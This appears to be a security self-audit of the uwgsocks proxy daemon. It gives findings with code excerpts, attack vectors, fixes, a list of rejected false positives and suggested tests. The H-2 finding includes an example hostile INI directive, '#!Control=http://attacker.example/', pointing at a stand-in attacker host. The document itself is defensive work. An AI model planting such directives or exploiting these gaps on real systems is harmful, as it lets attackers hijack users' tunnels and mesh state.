# Security findings — uwgsocks self-audit

**Date:** 2026-04-25
**Scope:** the `uwgsocks` daemon, `turn` daemon, `uwgfdproxy`, `uwgwrapper` /
preload, and the wg-quick parser, against the threat model the maintainer
provided (WG packets, tunneled L4, DNS, SOCKS/HTTP clients, fdproxy clients,
mesh-control clients, hostile wg-quick INI when scripts disabled).
**Methodology:** `SECURITY_REVIEW_PLAN.md`. Seven parallel reviews, then
manual verification of every claim before publishing. Findings the agents
raised that I confirmed are wrong are listed at the bottom so you don't have
to re-investigate them.

Severity:
- **High** — exploitable as described, on a default or common deployment
- **Medium** — requires a specific deployment shape, OR requires an attacker
  on a privileged side channel, OR is a clear DoS lever without RCE/auth
  consequences
- **Low** — defensive-depth, hardening, or correctness rather than security
- **Info** — by-design or already mitigated; included so a future reader does
  not re-flag it

---

## H-1. fdproxy Unix-socket has no SO_PEERCRED enforcement and races with chmod

**Severity:** High (multi-user host) / Low (single-user laptop, container)
**Files:** `internal/fdproxy/fdproxy.go:177-199`, `internal/fdproxy/fdproxy.go:231-247`

```go
// fdproxy.go:177-185
_ = os.Remove(path)
ln, err := net.ListenUnix("unix", &net.UnixAddr{Name: path, Net: "unix"})
if err != nil {
    return nil, err
}
if err := os.Chmod(path, 0o600); err != nil {
    _ = ln.Close()
    return nil, err
}
// ...
// fdproxy.go:231-247
func (s *Server) Serve() error {
    for {
        c, err := s.ln.AcceptUnix()
        if err != nil { return err }
        go s.handle(c)               // no SO_PEERCRED, no token, no uid check
    }
}
```

**Vector.** Default socket path is `/tmp/uwgfdproxy.sock` — a shared,
world-traversable directory. Two concrete weaknesses combine:

1. The socket is `bind()`ed under the process umask **before** the explicit
   `chmod(0o600)`. With a typical umask of 022 the socket is briefly
   `srwxr-xr-x`, so any local UID can `connect(2)` during that window.
2. After chmod, the per-user isolation rests entirely on the file mode. There
   is no `SO_PEERCRED` / `SO_PEERSEC` check on accept, no shared-secret
   handshake, no token. The server's `s.token` (line 190) is only used for
   the **outbound** connection to the uwgsocks API
   (`fdproxy.go:424: socketproto.DialHTTP(..., s.token, ...)`). Inbound
   requests from `preload` are accepted unconditionally.

So on a multi-user host, anyone who wins the race or who already has access
to the socket inode (e.g. via group permission misconfig, NFS, container with
shared `/tmp`) can submit `CONNECT`/`LISTEN`/`ATTACH`/`DNS` commands and get
the wrapped user's tunnel.

**Fix.**
- Open the socket inside a per-user dir created with `0o700` (e.g.
  `XDG_RUNTIME_DIR/uwgfdproxy/sock`) or use the abstract namespace
  (`@uwgfdproxy-<uid>-<rand>`) so the path is not in `/tmp`.
- After accept, call `unix.GetsockoptUcred(fd, SOL_SOCKET, SO_PEERCRED)` and
  reject any peer whose UID is not the server's UID (root may also be
  acceptable). This single check makes the rest of the issues moot.
- Optionally close the racing window with `umask(0o077)` around `ListenUnix`
  or use `Listener.SetUnlinkOnClose` with a temp filename + `rename`.

---

## H-2. wg-quick parser has no strict mode — `#!Control=` from a hostile INI is honored at runtime

**Severity:** High **if** uwgsocks accepts wg-quick INI from the network
**Files:** `internal/config/config.go:1119` (`MergeWGQuick`),
`internal/config/config.go:1177-1251` (`applyWGDirective`),
`internal/engine/api.go:648` (the API path that ingests user INI),
`internal/config/config.go:1282-1289` (PostUp/PreUp acceptance)

The CLAUDE.md threat model says:
> the wg-config (the .ini file of wireguard) can be supplied by the internet.
> Test if scripts runs is disabled (no PostUp/PostDown) then the ini is
> strictly validated.

That strict-mode parser does not exist. There is exactly one parser
(`MergeWGQuick`) reached from every ingestion path — file, inline string,
runtime API — with no `Strict` / `FromUntrustedSource` flag. It:

1. **Always** accepts `PostUp/PostDown/PreUp/PreDown` and stores them in the
   `WireGuard` struct. They are only gated *at execution time* by
   `Scripts.Allow` elsewhere. If a future code path or a user mistake ever
   surfaces those strings to a script runner, it executes.
2. **Always** accepts `#!Control=<URL>`, `#!URL=<URL>`, `#!TURN=<URL>`,
   `#!SkipVerifyTLS=yes` regardless of `Scripts.Allow`. These directives are
   load-bearing: a `#!Control=http://attacker.example/` causes the engine to
   later POST/GET signed requests to attacker-controlled HTTP, which leaks
   the peer pubkey + the `addrBinding` and gives the attacker a write
   primitive into mesh ACL state on the victim. `#!SkipVerifyTLS=yes`
   downgrades the TLS verification of subsequent transport URLs.
3. **Silently accepts unknown** `#!`-directives — `applyWGDirective`'s
   `switch` returns `nil` on the default branch, so `#!FOO=bar` is a no-op
   today and will quietly start doing something the day you add it.
4. **Has no per-directive value cap.** `peer.ConnectURL = value` and
   `dst.TURNDirectives = append(...)` accept multi-MB strings.

**Vector.** The user explicitly listed "wg-config from the internet" as
untrusted. Even with `scripts.allow=false`, the malicious INI can ship
`#!Control=http://attacker/` and the runtime fetches mesh control state from
the attacker the moment the config is loaded.

**Fix.**
- Add `MergeWGQuickStrict` (or a `Strict bool` argument) and route
  `internal/engine/api.go:648`, plus any other endpoint that takes
  attacker-controlled INI, through it.
- In strict mode reject: `PostUp`, `PostDown`, `PreUp`, `PreDown`, all
  `#!Control`, `#!URL`, `#!TURN`, `#!SkipVerifyTLS`, and any unknown `#!`
  key. Also clamp directive value length (e.g. 2 KiB).
- Add a default-`return fmt.Errorf("unknown directive %q", key)` in
  `applyWGDirective` (gated on strict mode) so future additions fail closed.

---

## M-1. TURN HTTP/WebSocket carrier `peers` map is unbounded by concurrent connections

**Severity:** Medium (DoS — memory + goroutine exhaustion)
**File:** `internal/transport/turn_carriers.go:30-93, 322, 640, 712`

```go
// turn_carriers.go:36
peers map[string]*turnPacketPeer

// turn_carriers.go:67-74
func (c *turnMuxPacketConn) addPeer(addr net.Addr, write ..., closeFn ...) {
    key := addr.String()
    c.mu.Lock()
    if old := c.peers[key]; old != nil && old.close != nil { _ = old.close() }
    c.peers[key] = &turnPacketPeer{...}
    c.mu.Unlock()
}
```

`addPeer` is called from three carrier paths
(`turn_carriers.go:322` for HTTP+WS, `:640` for QUIC datagram, `:712` for
HTTP+WS over a 2nd entry). Cleanup happens only when the carrier
`pumpTURNWebSocketFrames` goroutine returns (`:340-344`). There is no
**concurrent connection cap**, no per-source-IP cap, and no idle eviction
sweep. An attacker who can complete WebSocket upgrades faster than your
process can detect and close them grows the map and the matching goroutine
set linearly. Go map entry + goroutine + `net.Conn` is a few KiB; FD
exhaustion comes first, but until then memory grows freely.

Note this is independent of the TURN allocation cap
(`turn/open_turn_pion.go: maxPendingAllocations = 64`), which is enforced
correctly at a different layer.

**Fix.** Add a per-carrier `maxConns` (e.g. 4096) and reject upgrades when
hit, OR a per-source-IP cap, OR an idle-timeout reaper that closes peers that
haven't sent a frame in N minutes. The existing `c.mu` already serializes the
counters, so this is a one-line check before `c.peers[key] = ...`.

---

## M-2. WebSocket and TURN HTTP listeners do not set `MaxHeaderBytes` (defaults to 1 MiB)

**Severity:** Medium (DoS — accepts 1 MiB of request headers per upgrade)
**Files:** `internal/transport/websocket.go:242-245`,
`internal/transport/turn_carriers.go:274-276`

```go
srv := &http.Server{
    Handler:           mux,
    ReadHeaderTimeout: 10 * time.Second,
    // MaxHeaderBytes defaults to http.DefaultMaxHeaderBytes = 1 << 20
}
```

For comparison, the runtime API server in `internal/engine/api.go:104-110`
explicitly sets `MaxHeaderBytes: 1 << 20`. The websocket / TURN carrier HTTP
servers don't override this either way, so they get the same 1 MiB default.
Combined with the absence of M-1's connection cap, an attacker can park N
half-open upgrades each carrying ~1 MiB of headers.

**Fix.** Set `MaxHeaderBytes: 32 << 10` (or similar, matching the actual
header set you accept) on both transport HTTP servers.

---

## M-3. Mesh control `/v1/resolve` is a DoH-shaped amplifier when API uses `AllowUnauthenticatedUnix=true`

**Severity:** Medium (only on a specific config)
**File:** `internal/engine/api.go:142-186`, gating in `apiAuth` at
`internal/engine/api.go:349-370`

```go
// api.go:354
isUnix := r.RemoteAddr == "@" || r.RemoteAddr == "" || strings.HasPrefix(r.RemoteAddr, "/")
if isUnix && allowUnix { next.ServeHTTP(w, r); return }   // skips token
// api.go:173-185 — handleAPIResolve sends payload to system DNS, returns answer
```

When the API is exposed on a Unix socket and the operator sets
`api.allow_unauthenticated_unix: true` (a common ergonomic choice for
sibling-process callers), `/v1/resolve` and `/uwg/resolve` become
**unauthenticated DoH endpoints**. The only guard is the global
`acquireDNSTransaction` semaphore — there is no per-source rate limit
(every Unix-socket caller looks like the same `RemoteAddr=""`). A local
unprivileged process that can `connect()` the Unix socket can pump DNS
queries at the system resolver and read the answers, doubling as a DNS
amplifier for any upstream the system resolver talks to.

If your mesh control HTTP path also wires through this mux on a network
listener, the same gap applies there. (Quick check: `mesh_control.go:294-297`
registers its own mux without `/v1/resolve`, so mesh clients are not exposed
today — confirmed safe.)

**Fix.** Either require the token even on Unix sockets for `/v1/resolve`, or
add per-creds (`SO_PEERCRED`-derived) rate limiting. At minimum, scope
`AllowUnauthenticatedUnix` to a documented allowlist of paths.

---

## M-4. Outbound HTTP-CONNECT proxy dialer races its own context deadline

**Severity:** Medium (correctness; can cause partial CONNECT writes that look
like data injection to the upstream)
**File:** `internal/engine/outbound_proxy.go:143-175`

```go
c, err := d.DialContext(ctx, "tcp", p.Address)
if err != nil { return nil, err }
if deadline, ok := ctx.Deadline(); ok {
    _ = c.SetDeadline(deadline)        // applied AFTER dial
}
// ...write CONNECT line...
// ...read response...
```

If the context deadline is mostly consumed by the TCP dial, the CONNECT
write happens with an extremely short remaining deadline. A partial write
followed by close can leave a half-formed `CONNECT host:port HTTP/1.1\r\n…`
sitting on the upstream proxy's read buffer; on a keep-alive HTTP proxy this
can be misinterpreted as the start of the next request (HTTP request
smuggling shape). Compare to `serveSOCKSConn` (`socks.go:88-94`) which sets
its own fresh `socksRequestDeadline` independent of upstream context.

**Fix.** Set a fresh, short, *additive* deadline (e.g. `time.Now().Add(5s)`)
specifically around the CONNECT write+read phase, the same way SOCKS does.

---

## M-5. SOCKS5 UDP-relay cap of 4096 sessions per *connection* is per-conn, not per-source

**Severity:** Medium (DoS — memory amplification by N concurrent SOCKS conns)
**File:** `internal/engine/socks.go:61, 514-517, 531, 549`

```go
maxSOCKSUDPSessionsPerConn = 4096
// ...
if maxSOCKSUDPSessionsPerConn > 0 && len(sessions) >= maxSOCKSUDPSessionsPerConn {
    return nil, ..., errSOCKSUDPRelayAtLimit
}
// ...
go readSOCKSUDPReplies(...)         // per-session goroutine
buf := make([]byte, 64*1024)        // per-goroutine 64 KiB buffer
```

Per SOCKS5 connection, an attacker can open 4096 UDP sessions, each with a
64 KiB receive buffer and a goroutine — ~256 MiB per attacker connection.
If the SOCKS5 listener has no concurrent-connection cap (it does not), N
hostile SOCKS clients multiply this without bound.

**Fix.** Lower the per-conn default (256 is plenty for normal apps), and add
a global / per-source-IP cap on concurrent SOCKS5 connections. Log when the
limit trips so operators have visibility.

---

## L-1. Outbound SOCKS5 dialer: unchecked type assertion on `*net.UDPConn`

**Severity:** Low (defensive only — current `net.Dial("udp", ...)` always
returns `*net.UDPConn`)
**File:** `internal/transport/proxy_socks5.go:87`

```go
udpConn, err := net.Dial("udp", relayAddr)
// ...
pc := &socks5UDPConn{ UDPConn: udpConn.(*net.UDPConn), ctrlConn: ctrlConn }
```

If you ever swap the dialer for a wrapped one, this panics. Replace with
`udp, ok := udpConn.(*net.UDPConn); if !ok { ... }`.

---

## L-2. TURN carrier silently drops frames when `readCh` is full

**Severity:** Low (protocol degradation, not a vuln)
**File:** `internal/transport/turn_carriers.go:87-93`

```go
select {
case c.readCh <- pkt:
default:                            // silently dropped
}
```

`readCh` is a 256-slot buffer. Under sustained load packets disappear with
no log. Consider a counter + periodic warn log.

---

## L-3. Mesh control still accepts v1 bearer tokens; no functional weakness today, but dead code

**Severity:** Low / Info
**File:** `internal/engine/mesh_control.go:150, 189-195`

```go
if tokenVersion != meshTokenVersionV1 && tokenVersion != meshTokenVersionV2 {
    return meshAuthResult{}, errors.New("unsupported bearer token version")
}
// ...
if tokenVersion >= meshTokenVersionV2 {
    staticShared, _ := a.privKey.ECDH(eph)
    authKey = meshAuthKey(k1, staticShared)
}
```

I checked this carefully because the agent flagged it High. **It is not.**
Both v1 and v2 require the verifier to know `peerPriv` (the WG private key
of the impersonated peer) and the per-peer PSK to compute the final shared
secret hash. v2 only adds defense-in-depth against future server-static-key
compromise. Suggest still removing v1 since `Challenge()` only ever
advertises `meshTokenVersionV2` (`mesh_control.go:132`) — the v1 branch is
unused except by stale clients.

---

## L-4. Mesh challenge state retained for an extra rotation period

**Severity:** Info (intentional grace)
**File:** `internal/engine/mesh_control.go:255-267`

```go
if a.prev.priv != nil &&
   now.Before(a.prev.expires.Add(time.Duration(... ChallengeRotateSeconds)*time.Second)) {
    states = append(states, a.prev)
}
```

Effectively doubles the lifetime of any leaked challenge ephemeral key.
Probably fine (and serves clients who got a challenge near a rotation
boundary), but it's worth a comment so the next reader doesn't think it's a
bug.

---

# Things the agents flagged that are not actually vulnerabilities

I verified each of these — please don't spend time re-investigating:

| Claim | Why it's not real |
|---|---|
| "HTTP CONNECT host header spoofs CONNECT target via `r.Host`" at `engine.go:1041` | Verified live with a tiny Go program: for an HTTP CONNECT, `net/http` populates `r.Host` from the **request-target** (`CONNECT host:port HTTP/1.1`), not from the `Host:` header. The `Host:` header is overridden. |
| "Socket API HTTP-upgrade bypasses `apiAuth`" | The mux is wrapped at `api.go:105` (`Handler: e.apiAuth(mux)`) so `apiAuth` runs **before** the handler is dispatched, which is before any hijack. There is no auth bypass. |
| "ICMP error inner packet allows OOB read in `parseRelayPacket(transport[8:])`" | `parseRelayPacket` checks `len==0`, then `parseRelayIPv4Packet` requires `>=20`, `parseRelayIPv6Packet` requires `>=40`, `packetPorts` requires `>=4`, TCP flags are gated by `>=14`. Every layer is bounded. False positive. |
| "WebSocket frame size unbounded at `make([]byte, int(payLen))`" | Bounded by `if payLen > maxWireGuardPacket` immediately above (`websocket.go:310`). Safe. |
| "fdproxy `UWGS_FDPROXY` env var lets a malicious app redirect to a hostile socket" | Out of scope per stated trust model: "for fdproxy and uwgwrapper, the application itself it runs is trusted." |
| "`shared_state.h` is `PROT_WRITE` so a malicious app can corrupt the manager" | Same — wrapped app is trusted. |
| "fdproxy `ReadMsgUnix` accepts unbounded FD count" | The OOB buffer is exactly `CmsgSpace(maxRecvRightsFDs*4)` so the kernel will not deliver more than 16 FDs in one message; the parse loop closes any extras beyond `fds[0]`. Bounded. |
| "QUIC accept loop panic-recover races a closed channel" | The recover-side send uses `select { case acceptCh <- ...: case <-closeCh: default: }` — a `default` makes it non-blocking; closed-channel send only happens if `acceptCh` itself is closed, which the code does not do. Safe. |

---

# Suggested follow-up tests

These would make great additions to `tests/malicious/`:

1. `TestFDProxyOtherUserCannotConnect` — bind the server, drop privileges to
   another uid, attempt to `connect()` → must fail.
2. `TestWGQuickRejectsHostileDirectivesInStrictMode` — once the strict
   parser exists, fuzz it with `PostUp`, `#!Control=http://`, `#!URL`,
   `#!FOO=`, multi-MB values.
3. `TestTURNCarrierConcurrentConnectionCap` — open >cap WebSocket upgrades
   in parallel, assert (a) cap is hit, (b) memory is bounded.
4. `TestSOCKS5UDPGlobalLimit` — N parallel SOCKS5 conns each opening UDP
   ASSOCIATE up to the per-conn cap, measure goroutine + heap growth.
5. `TestAPIResolveRequiresAuthEvenOnUnix` — flip the toggle, assert
   `/v1/resolve` still 401s without a token.
